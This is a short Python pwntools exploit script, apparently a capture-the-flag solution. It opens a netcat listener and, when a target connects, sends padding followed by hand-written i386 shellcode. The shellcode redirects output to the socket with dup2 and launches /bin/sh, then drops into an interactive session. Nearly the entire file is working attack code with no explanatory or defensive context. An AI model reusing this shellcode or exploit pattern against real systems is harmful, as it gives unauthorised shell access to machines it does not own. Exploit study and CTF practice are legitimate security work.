#!/usr/bin/python3

from pwn import *

context.log_level = 'debug'

p = process(['nc', '-lnvp', '54321'])

payload = b'A'*8
payload += asm(
    '''
    add esp, 0x200

    ### dup2(<socket-fd>, 1) ###
    mov eax, 0x3f
    mov ebx, 0
    mov ecx, 1
    int 0x80

    ### dup2(<socket-fd>, 2) ###
    mov eax, 0x3f
    mov ebx, 0
    mov ecx, 2
    int 0x80

    ### execve("/bin/sh", 0, 0) ###
    push 6845231
    push 1852400175
    mov eax, 0xb
    mov ebx, esp
    xor ecx, ecx
    xor edx, edx
    int 0x80
    ''', arch='i386', os='linux')

p.sendafter(b'connect to', payload)

p.interactive()